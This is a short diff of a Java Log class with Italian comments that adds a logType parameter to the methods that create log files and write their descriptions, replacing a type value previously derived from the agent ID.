@@ -143,7 +143,6 @@ public final class Log {
         this();
 
         agent = agent_;
-
         encryption.makeKey(aesKey);
     }
 
@@ -199,6 +198,10 @@ public final class Log {
         return ret;
     }
 
+    public synchronized boolean createLog(final byte[] additionalData) {
+        return createLog(additionalData,convertTypeLog(agent.agentId));
+    }
+    
     /**
      * Questa funzione crea un file di log e lascia l'handle aperto. Il file
      * viene creato con un nome casuale, la chiamata scrive l'header nel file e
@@ -214,7 +217,7 @@ public final class Log {
      *            the additional data
      * @return true, if successful
      */
-    public synchronized boolean createLog(final byte[] additionalData) {
+    public synchronized boolean createLog(final byte[] additionalData, int logType) {
 
         //#ifdef DBC
         Check.requires(os == null && fconn == null,
@@ -268,7 +271,7 @@ public final class Log {
             // #debug info
             debug.info("Created :" + plainFileName + " = " + fileName);
 
-            final byte[] plainBuffer = makeDescription(additionalData);
+            final byte[] plainBuffer = makeDescription(additionalData, logType);
             // #ifdef DBC
             Check.asserts(plainBuffer.length >= 32 + additionalLen,
                     "Short plainBuffer");
@@ -316,7 +319,7 @@ public final class Log {
      *            the additional data
      * @return the byte[]
      */
-    public byte[] makeDescription(final byte[] additionalData) {
+    public byte[] makeDescription(final byte[] additionalData, int logType) {
 
         if (timestamp == null) {
             timestamp = new Date();
@@ -332,7 +335,7 @@ public final class Log {
 
         logDescription = new LogDescription();
         logDescription.version = LOG_VERSION_01;
-        logDescription.logType = convertTypeLog(agent.agentId);
+        logDescription.logType = logType;
         logDescription.hTimeStamp = datetime.hiDateTime();
         logDescription.lTimeStamp = datetime.lowDateTime();
         logDescription.additionalData = additionalLen;
